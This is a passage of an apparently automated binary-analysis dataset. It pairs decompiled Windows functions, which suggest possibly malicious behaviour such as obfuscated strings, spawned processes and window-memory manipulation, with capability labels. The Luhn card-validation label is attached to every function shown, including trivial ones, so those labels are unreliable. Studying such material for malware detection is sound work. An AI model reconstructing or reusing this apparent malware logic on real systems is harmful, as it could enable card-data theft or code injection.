        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0040b1a5(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    int64_t iVar5;\n    uint var_1h;\n    \n    fcn.004092fa();\n    *0x4335a2 = fcn.00402869();\n    bVar1 = true;\n    fcn.00407c1d(str.ZEQ_, 7, 0xf3352960);\n    iVar3 = fcn.00402cec();\n    uVar4 = 0;\n    if ((iVar3 != 0) && (cVar2 = fcn.0040270a(),  cVar2 != '\\0')) {\n        fcn.00407c1d(0x412444, 7, 0xec977969);\n        fcn.00402cec();\n        iVar5 = fcn.00402da4();\n        *0x43359a = 1;\n        if (iVar5 == 0) {\n            *0x43359a = 0;\n        }\n    }\n    fcn.00407c1d(0x4122f4, 7, 0x215a99ac);\n    iVar3 = fcn.00402cec();\n    if (iVar3 != 0) {\n        fcn.00407c1d(0x4122fc, 10, 0xe11e2f1e);\n        iVar3 = fcn.00402cec();\n        if (iVar3 != 0) {\n            fcn.00407c1d(0x41244c, 9, 0x65518e1d);\n            fcn.00402cec();\n            iVar5 = fcn.00402da4();\n            *0x43359b = 1;\n            if (iVar5 == 0) {\n                *0x43359b = 0;\n            }\n        }\n    }\n    cVar2 = fcn.00402699();\n    if (cVar2 == '\\0') {\n        fcn.00407c1d(0x412458, 5, 0xcbe1d8db);\n        iVar3 = fcn.00402cec();\n        if (iVar3 == 0) goto code_r0x0040b2e6;\n        fcn.00407c1d(0x412460, 8, 0x883e91f5);\n        fcn.00402cec();\n        iVar5 = fcn.00402da4();\n        bVar1 = true;\n        if (iVar5 != 0) goto code_r0x0040b2e6;\n    }\n    bVar1 = false;\ncode_r0x0040b2e6:\n    fcn.0040fa7f(unaff_EDI);\n    cVar2 = fcn.00402699();\n    if (cVar2 == '\\0') {\n        if ((bVar1) && (cVar2 = fcn.0040b0a1(unaff_EDI),  cVar2 == '\\0')) {\n            *0x413a58 = fcn.00407c1d(0x41246c, 1, 0xeec4e4fe);\n        }\n        else {\n            uVar4 = 1;\n        }\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 761
    },
    "0040b32f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b32f(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00407c87();\n    if (var_4h != 0) {\n        if (arg_ch != 0) {\n            uVar1 = fcn.00407c1d(0x412478, 3, 0x31f2182e);\n            fcn.00407eb0(0, uVar1, arg_ch);\n        }\n        uVar1 = fcn.00407c1d(0x411d00, 2, 0xf4139a24);\n        uVar1 = fcn.00407f94(uVar1);\n        (**0x413498)(arg_8h, var_4h, uVar1, &var_8h, 0);\n        fcn.00406d25();\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0040b3a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b3a8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_2a4h;\n    uint var_19ch;\n    uint var_94h;\n    uint s;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_48h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    (**0x413824)(&var_48h, 1);\n    (**0x413820)(&var_48h, 1, 0, 0);\n    var_1ch = &var_48h;\n    var_20h = 0xc;\n    var_18h = 1;\n    iVar1 = (**0x413400)(&var_8h, &var_ch, &var_20h, 0);\n    if (iVar1 != 0) {\n        iVar1 = (**0x413400)(&var_14h, &var_10h, &var_20h, 0);\n        if (iVar1 != 0) {\n            fcn.00408fc9(&var_34h);\n            (**0x4133fc)(&var_19ch, 0x104);\n            uVar2 = fcn.00407c1d(0x41247c, 10, 0x7ce81513, &var_19ch);\n            (**0x413084)(&var_2a4h, uVar2);\n            sub.ntdll.dll_memset(&s, 0, 0x40);\n            var_30h = 0;\n            var_2ch = 0;\n            uStack44 = 0;\n            uStack40 = 0;\n            var_64h._0_2_ = 0;\n            var_58h = var_10h;\n            var_54h = var_10h;\n            var_5ch = var_8h;\n            var_94h = 0x44;\n            var_68h = 0x101;\n            iVar1 = (**0x4133f4)(&var_2a4h, 0, 0, 0, 1, 0x10, 0, 0, &var_94h, &var_30h);\n            if (iVar1 != 0) {\n                fcn.0040b32f(var_ch, *(arg_8h + 4));\n                (**0x4134e8)(var_30h);\n                (**0x4134e8)(var_2ch);\n            }\n            (**0x4134e8)(var_10h);\n            (**0x4134e8)(var_14h);\n        }\n        (**0x4134e8)(var_8h);\n        (**0x4134e8)(var_ch);\n    }\n    return;\n}\n",
        "token_count": 733
    },
    "0040b524": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b524(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint arg_8h_00;\n    int32_t iVar1;\n    int64_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00407c1d(0x412488, 0xd, 0x13bf7e7f);\n    fcn.00402cec();\n    iVar2 = fcn.00402da4();\n    if (iVar2 != 0) {\n        (**0x413210)(4, 0x3005, 0x433628, 0);\n        (**0x4133e0)(0x433628, 0, 4);\n        arg_ch = (**0x413148)(0x433628, 0x433628);\n        arg_8h_00 = fcn.00407c1d(0x412498, 0x4f, 0x4f1356a5);\n        iVar1 = fcn.00407e4e(arg_8h_00, arg_ch);\n        if (iVar1 != 0) {\n            var_ch = 0;\n            var_10h = var_8h;\n            fcn.0040b3a8(&var_10h);\n            fcn.00406d25();\n        }\n        fcn.0040b514();\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0040b66f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040b66f(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_2c0h;\n    uint var_b8h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_6ch;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint var_58h;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    uStack60 = 0;\n    uStack56 = 0;\n    uStack52 = 0;\n    var_1h._0_1_ = 0;\n    var_8h = NULL;\n    var_3ch = 1;\n    uVar1 = (**0x4136d4)(&var_2ch, &var_3ch, 0);\n    if (uVar1 != 0) goto code_r0x0040b8b4;\n    var_14h = 0;\n    iVar2 = (**0x4136dc)(arg_8h, 0, &var_14h);\n    if ((iVar2 == 0) && (var_14h != 0)) {\n        var_ch = 0;\n        var_28h = 0;\n        iVar2 = (**0x4136e4)(&var_ch, &var_28h);\n        if ((iVar2 == 0) &&\n           (((var_28h != 0 && (var_ch != 0)) && (iVar2 = fcn.00406c76(),  var_24h = iVar2,  iVar2 != 0)))) {\n            iVar3 = (**0x4136e8)(var_ch, var_28h, iVar2);\n            if (iVar3 == 0) {\n                fcn.00407890(arg_14h, 0, &var_2c0h);\n                var_1ch = 0;\n                iVar3 = (**0x413124)(0, &var_2c0h, 0, 0, 0, 1, &var_1ch, 0);\n                if (-1 < iVar3) {\n                    var_10h = 0;\n                    if (var_ch != 0) {\n                        puVar4 = iVar2 + 0x30;\n                        do {\n                            iVar3 = (**0x413388)(var_1ch, *puVar4);\n                            if (iVar3 == 0) {\n                                puVar4 = var_10h * 0x4c + iVar2;\n                                var_6ch = *puVar4;\n                                uStack108 = puVar4[1];\n                                uStack104 = puVar4[2];\n                                uStack100 = puVar4[3];\n                                var_ch = 0;\n                                break;\n                            }\n                            var_10h = var_10h + 1;\n                            puVar4 = puVar4 + 0x13;\n                        } while (var_10h < var_ch);\n                    }\n                    (**0x413268)(var_1ch);\n                }\n            }\n            fcn.00406d25();\n            if ((var_ch == 0) && (iVar2 = (**0x41326c)(0, 1, &var_8h),  iVar2 == 0)) {\n                if (var_8h != NULL) {\n                    var_58h = *0x411fb0;\n                    uStack88 = *0x411fb4;\n                    uStack84 = *0x411fb8;\n                    uStack80 = *0x411fbc;\n                    var_48h = 1;\n                    var_5ch = 1;\n                    var_40h = &var_24h;\n                    var_24h = 0x32;\n                    var_44h = 4;\n                    iVar2 = (**0x4136ec)(var_14h, var_8h, &var_6ch, &var_5ch);\n                    if (iVar2 == 0) {\n                        var_20h = 0;\n                        var_1ch = 0;\n                        (**(*var_8h + 0x14))(var_8h, 0, 0, 0, 0);\n                        goto code_r0x0040b830;\n                    }\n                    (**(*var_8h + 8))(var_8h);\n                    var_8h = NULL;\n                }\n            }\n            else {\ncode_r0x0040b830:\n                if (var_8h != NULL) {\n                    iVar2 = (**(*var_8h + 0x30))(var_8h, &var_b8h, 1);\n                    if (((iVar2 == 0) && (var_ach == 0)) && (iVar2 = fcn.00406c7f(),  iVar2 != 0)) {\n                        iVar3 = (**(*var_8h + 0xc))(var_8h, iVar2, var_b0h, &var_b0h);\n                        if (iVar3 == 0) {\n                            *arg_10h = var_b0h;\n                            *arg_ch = iVar2;\n                            var_1h._0_1_ = 1;\n                        }\n                        else {\n                            fcn.00406d25();\n                        }\n                    }\n                    (**(*var_8h + 8))(var_8h);\n                }\n            }\n        }\n        (**0x4136e0)(var_14h);\n    }\n    uVar1 = (**0x4136d8)(var_2ch);\ncode_r0x0040b8b4:\n    return uVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1444
    },
    "0040bfc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.0040bfc9(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t *unaff_retaddr;\n    \n    iVar1 = (**0x4133b8)(0x412538);\n    if (iVar1 != 0) {\n        iVar1 = *(iVar1 + 0x3c) + iVar1;\n        *unaff_retaddr = *(iVar1 + 0x40);\n        *param_1 = *(iVar1 + 0x42);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "0040c345": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong fcn.0040c345(uint32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    \n    uVar1 = *(*0x43477c + *0x434754);\n    fcn.0040c329(*0x434768, *0x434780 + (*0x434754 - *0x434788), \n                 *0x434784 + (-(*0x434754 < *0x434788) - *0x43478c) + CARRY4(*0x434780, *0x434754 - *0x434788), param_1\n                 , param_2);\n    pcVar2 = _sym.imp.USER32.dll_GetAncestor;\n    (*_sym.imp.USER32.dll_GetAncestor)(*0x434778, 1);\n    fcn.0040c329(*0x434768, *0x434780 + (*0x434754 - *0x434788), \n                 *0x434784 + (-(*0x434754 < *0x434788) - *0x43478c) + CARRY4(*0x434780, *0x434754 - *0x434788), \n                 param_1 + 4, param_2 + (0xfffffffb < param_1));\n    uVar3 = (*pcVar2)(*0x434778, 1);\n    fcn.0040c329(*0x434768, *0x434780 + (*0x434754 - *0x434788), \n                 *0x434784 + (-(*0x434754 < *0x434788) - *0x43478c) + CARRY4(*0x434780, *0x434754 - *0x434788), uVar1, \n                 unaff_ESI);\n    return CONCAT44(uVar3, unaff_EBX);\n}\n",
        "token_count": 435
    },
    "0040c61c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040c61c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t arg_ch;\n    ulong uVar7;\n    int64_t iVar8;\n    \n    uVar7 = fcn.0040c345(*0x434790 + *0x434758, *0x434794 + CARRY4(*0x434790, *0x434758));\n    fcn.0040c345(uVar7);\n    iVar8 = fcn.0040c345(uVar7);\n    do {\n        iVar1 = *0x434798;\n        if (*0x434798 == 0) {\n            iVar1 = (**0x4134dc)();\n        }\n        uVar6 = *0x43475c;\n        uVar7 = fcn.0040c345(iVar8 + 0x43475c);\n        uVar2 = uVar7 - uVar6;\n        iVar5 = (uVar7 >> 0x20) - (uVar7 < uVar6);\n        iVar8 = CONCAT44(iVar5, uVar2);\n        iVar3 = fcn.0040c345((uVar6 + uVar2) - 8, iVar5 + CARRY4(uVar6, uVar2) + -1 + (7 < uVar6 + uVar2));\n    } while (iVar3 != iVar1);\n    iVar1 = *0x434760 + uVar2;\n    iVar3 = iVar5 + CARRY4(*0x434760, uVar2);\n    fcn.0040c345(iVar1, iVar3);\n    do {\n        uVar6 = *0x43475c;\n        uVar7 = fcn.0040c345(*0x43475c + uVar2, iVar5 + CARRY4(*0x43475c, uVar2));\n        uVar2 = uVar7 - uVar6;\n        iVar5 = (uVar7 >> 0x20) - (uVar7 < uVar6);\n        iVar4 = fcn.0040c345((uVar6 + uVar2) - 8, iVar5 + CARRY4(uVar6, uVar2) + -1 + (7 < uVar6 + uVar2));\n    } while (iVar4 != 4);\n    uVar7 = fcn.0040c345(*0x434760 + uVar2, iVar5 + CARRY4(*0x434760, uVar2));\n    iVar5 = uVar7 >> 0x20;\n    uVar6 = uVar7 & 0xfffffff0;\n    iVar4 = uVar6 - 0x30;\n    arg_ch = iVar5 + -1 + (0x2f < uVar6);\n    iVar8 = fcn.0040c345(iVar4, arg_ch);\n    fcn.0040c453(iVar4, arg_ch, iVar8 + 10, iVar8 + 10 >> 0x20);\n    fcn.0040c453(iVar1, iVar3, uVar7, iVar5);\n    return 1;\n}\n",
        "token_count": 718
    },
    "0040c880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040c880(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    arg_8h = (**0x413090)(0, 0x8002, 0, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0);\n    if (arg_8h != 0) {\n        iVar1 = fcn.0040c2fa(arg_8h);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongW)(arg_8h, 0, 0x31323334);\n            do {\n                if (*(uVar2 + iVar1) == 0x31323334) break;\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < 0x200);\n        }\n        (*_sym.imp.USER32.dll_DestroyWindow)(arg_8h);\n    }\n    return uVar3;\n}\n",
        "token_count": 255
    },
    "0040d197": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d197(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SetWindowLongW;\n    uVar1 = *(*0x434804 + *0x4347e4);\n    (*_sym.imp.USER32.dll_SetWindowLongW)(*0x4347f4, *0x434808 + (*0x4347e4 - *0x43480c), arg_8h);\n    uVar3 = (*_sym.imp.USER32.dll_GetAncestor)(*0x434800, 1);\n    (*pcVar2)(*0x4347f4, *0x434808 + (*0x4347e4 - *0x43480c), uVar1);\n    return uVar3;\n}\n",
        "token_count": 195
    },
    "0040d3a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040d3a1(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_ch;\n    \n    arg_8h = fcn.0040d197(*0x434810 + *0x4347e8);\n    fcn.0040d197(arg_8h);\n    iVar1 = fcn.0040d197(arg_8h);\n    do {\n        iVar2 = *0x434818;\n        if (*0x434818 == 0) {\n            iVar2 = (**0x4134dc)();\n        }\n        iVar1 = fcn.0040d197(*0x4347ec + iVar1);\n        iVar1 = iVar1 - *0x4347ec;\n        iVar3 = fcn.0040d197(*0x4347ec + -4 + iVar1);\n    } while (iVar3 != iVar2);\n    iVar2 = *0x4347f0 + iVar1;\n    fcn.0040d197(iVar2);\n    do {\n        iVar1 = fcn.0040d197(*0x4347ec + iVar1);\n        iVar1 = iVar1 - *0x4347ec;\n        iVar3 = fcn.0040d197(*0x4347ec + -4 + iVar1);\n    } while (iVar3 != 4);\n    arg_ch = fcn.0040d197(*0x4347f0 + iVar1);\n    iVar1 = fcn.0040d197((arg_ch & 0xfffffff8) - 0x18);\n    fcn.0040d211((arg_ch & 0xfffffff0) - 0x18, iVar1 + 2);\n    fcn.0040d211(iVar2, arg_ch);\n    return 1;\n}\n",
        "token_count": 412
    },
    "0040d59f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040d59f(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    arg_8h = (**0x413090)(0, 0x8002, 0, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0);\n    if (arg_8h != 0) {\n        iVar1 = fcn.0040d168(arg_8h);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongW)(arg_8h, 0, 0x31323334);\n            do {\n                if (*(uVar2 + iVar1) == 0x31323334) break;\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < 0x200);\n        }\n        (*_sym.imp.USER32.dll_DestroyWindow)(arg_8h);\n    }\n    return uVar3;\n}\n",
        "token_count": 255
    },
    "0040dc8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040dc8a(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**0x4133a4)(param_1);\n    fcn.0040fdc1(iVar1 * 2);\n    return;\n}\n",
        "token_count": 59
    },
    "0040ddca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ddca(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00407c34(0x412128, 5, 0x868d95fd, arg_8h, *(in_EAX + 8));\n    fcn.00407df0(arg_8h_00, arg_8h);\n    return 0;\n}\n",
        "token_count": 114
    },
    "0040de5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040de5a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int64_t iVar4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x4129f8, 0x18);\n    fcn.00407c1d(0x4125c8, 10, 0xbca64cef);\n    iVar1 = fcn.00402cec();\n    if (iVar1 != 0) {\n        fcn.00407c1d(0x4125d4, 0xe, 0x188f9dd2);\n        fcn.00402cec();\n        iVar4 = fcn.00402da4();\n        if (iVar4 != 0) {\n            iVar1 = fcn.0040dca2(*(unaff_EBP + 0xc));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 != 0) {\n                *(unaff_EBP + -0x1c) = 0;\n                while (*(unaff_EBP + -0x1c) < *(iVar1 + 8)) {\n                    fcn.0040ddfd(*(unaff_EBP + 0xc));\n                    iVar2 = fcn.0040ddca(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -0x24) = iVar2;\n                    if (iVar2 != 0) {\n                        *(unaff_EBP + -4) = 0;\n                        uVar3 = fcn.00407c34(0x412470, 4, 0xb3c85bbb, iVar2, 0, *(unaff_EBP + 0xc), 1);\n                        uVar3 = (**0x4130ac)(uVar3);\n                        (**0x413208)(uVar3);\n                        *(unaff_EBP + -4) = 0xffffffff;\n                        fcn.00406d25();\n                    }\n                    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n                }\n            }\n        }\n    }\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 582
    },
    "0040df97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040df97(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 0;\n    iVar1 = fcn.00401127(arg_10h);\n    if (iVar1 != 0) {\n        iVar3 = fcn.00406c7f();\n        if (iVar3 != 0) {\n            uVar2 = fcn.00407c34(0x4125e4, 4, 0x5591f5ba, arg_8h, arg_ch);\n            uVar2 = fcn.00407df0(uVar2, arg_8h);\n            *(iVar3 + 4) = uVar2;\n            iVar1 = fcn.0040a9dc(&var_4h);\n            if (iVar1 == 0) {\n                fcn.00406d25();\n                fcn.00406d25();\n            }\n            else {\n                *(iVar3 + 0xc) = var_4h;\n                *(iVar3 + 8) = iVar1;\n            }\n        }\n        fcn.00406d25();\n    }\n    return iVar3;\n}\n",
        "token_count": 286
    },
    "0040e020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e020(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    cVar1 = fcn.0040b8bc(arg_8h, &var_4h, &var_8h, arg_10h);\n    if (cVar1 != '\\0') {\n        iVar3 = fcn.00406c7f();\n        if (iVar3 == 0) {\n            fcn.00406d25();\n        }\n        else {\n            uVar2 = fcn.00407c34(0x4125e4, 4, 0x5591f5ba, arg_ch, arg_10h);\n            uVar2 = fcn.00407df0(uVar2, arg_ch);\n            *(iVar3 + 4) = uVar2;\n            *(iVar3 + 0xc) = var_8h;\n            *(iVar3 + 8) = var_4h;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 283
    },
    "0040e09c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040e09c(uint param_1)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uStack12;\n    \n    fcn.00407c1d(0x4125c8, 10, 0xbca64cef);\n    iVar1 = fcn.00402cec();\n    if (iVar1 != 0) {\n        fcn.00407c1d(0x4125ec, 10, 0xb3a544c8);\n        fcn.00402cec();\n        arg_ch = fcn.00402e0b();\n        fcn.00407c1d(0x4125f8, 5, 0x4784fccf);\n        iVar1 = fcn.00402cec();\n        if (iVar1 != 0) {\n            uVar2 = fcn.00402c8f();\n            uStack12 = 0;\n            if (uVar2 != 0) {\n                do {\n                    iVar1 = fcn.00402cb6(uStack12);\n                    if (iVar1 != 0) {\n                        fcn.00407c1d(0x412600, 0xe, 0x5a371b20);\n                        fcn.00402cec();\n                        iVar1 = fcn.00402e0b();\n                        if (iVar1 != 0) {\n                            fcn.00407c1d(0x412610, 9, 0x64a82646);\n                            fcn.00402cec();\n                            iVar3 = fcn.00402e0b();\n                            if (iVar3 == 0) {\n                                iVar1 = fcn.0040e020(param_1, arg_ch, iVar1);\n                            }\n                            else {\n                                iVar1 = fcn.0040df97(arg_ch, iVar1, iVar3);\n                            }\n                            if (iVar1 != 0) {\n                                *0x43385c = fcn.00406c8c();\n                                iVar3 = *0x4338b8;\n                                if (*0x43385c != 0) {\n                                    *0x4338b8 = *0x4338b8 + 1;\n                                    *(*0x43385c + iVar3 * 4) = iVar1;\n                                }\n                            }\n                        }\n                    }\n                    uStack12 = uStack12 + 1;\n                } while (uStack12 < uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "0040e2b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e2b9(int32_t *arg_8h)\n\n{\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = 0;\n    var_4h = fcn.0040e1fc(*(unaff_EBX + 4), &var_8h);\n    if (var_4h != 0) {\n        iVar1 = fcn.00406c7f();\n        if (iVar1 != 0) {\n            (**0x413174)(iVar1, var_4h, var_8h + 1);\n            (**0x413174)(iVar1 + var_8h * 2, unaff_EBX + 0x1c, *(unaff_EBX + 0x18) + 1);\n            *(iVar1 + (*(unaff_EBX + 0x18) + var_8h) * 2) = 0;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n        fcn.00406d25();\n    }\n    return iVar1;\n}\n",
        "token_count": 272
    },
    "0040e332": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __thiscall fcn.0040e332(uint32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    \n    if (param_1 != NULL) {\n        uVar2 = 0;\n        if (*param_1 != 0) {\n            piVar1 = param_1[2];\n            do {\n                if (param_2 == *piVar1) {\n                    return 1;\n                }\n                uVar2 = uVar2 + 1;\n                piVar1 = piVar1 + 1;\n            } while (uVar2 < *param_1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "0040e5aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.0040e5aa(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int16_t *piVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_73ch;\n    uint var_4ech;\n    uint var_2e4h;\n    uint var_d0h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00410580(0x4129b8, 0x72c);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -4) = 0;\n    iVar1 = (**0x413280)(0x411cd8, 0, 1, 0x411cc8, unaff_EBP + -0x20);\n    if (-1 < iVar1) {\n        *(unaff_EBP + -0x24) = 0;\n        iVar1 = (****(unaff_EBP + -0x20))(*(unaff_EBP + -0x20), 0x411ce8, unaff_EBP + -0x24);\n        if (-1 < iVar1) {\n            iVar1 = (**(**(unaff_EBP + -0x24) + 0x14))(*(unaff_EBP + -0x24), *(unaff_EBP + 8), 0);\n            if (-1 < iVar1) {\n                iVar1 = (**(**(unaff_EBP + -0x20) + 0xc))\n                                  (*(unaff_EBP + -0x20), unaff_EBP + -0x4ec, 0x104, unaff_EBP + -0x73c, 4);\n                if (-1 < iVar1) {\n                    *(unaff_EBP + -0x2c) = 0;\n                    iVar1 = (**(**(unaff_EBP + -0x20) + 0x10))(*(unaff_EBP + -0x20), unaff_EBP + -0x2c);\n                    if (-1 < iVar1) {\n                        (**0x41320c)(*(unaff_EBP + -0x2c), 0, unaff_EBP + -0x2e4, 0x2b4, 0x408);\n                        iVar1 = (**0x4133a4)(unaff_EBP + -0xd0);\n                        iVar1 = fcn.0040fdc1(iVar1 * 2);\n                        if ((iVar1 != *(unaff_EBP + 0xc)) && (iVar1 != *(unaff_EBP + 0x10))) {\n                            piVar2 = (**0x41314c)(unaff_EBP + -0x4ec);\n                            if ((piVar2 != NULL) && (*piVar2 != 0)) {\n                                uVar3 = fcn.00407c4b();\n                                